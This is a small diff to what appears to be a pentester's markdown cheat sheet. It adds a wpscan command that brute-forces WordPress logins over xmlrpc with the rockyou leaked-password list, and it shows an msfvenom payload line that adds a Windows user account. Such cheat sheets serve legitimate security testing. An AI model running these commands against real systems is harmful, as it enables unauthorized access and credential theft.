@@ -242,7 +242,8 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   ```
 ## wpscan
   ```
-  wpscan --disable-tls-checks -e u,ap --plugins-detection aggressive --url 
+  wpscan --disable-tls-checks -e u,ap --plugins-detection aggressive --url
+  wpscan --password-attack xmlrpc -t 20 -U doug -P .\SecLists\Passwords\Leaked-Databases\rockyou.txt --url
   ```
 ## signingssl
  ```
@@ -272,5 +273,6 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
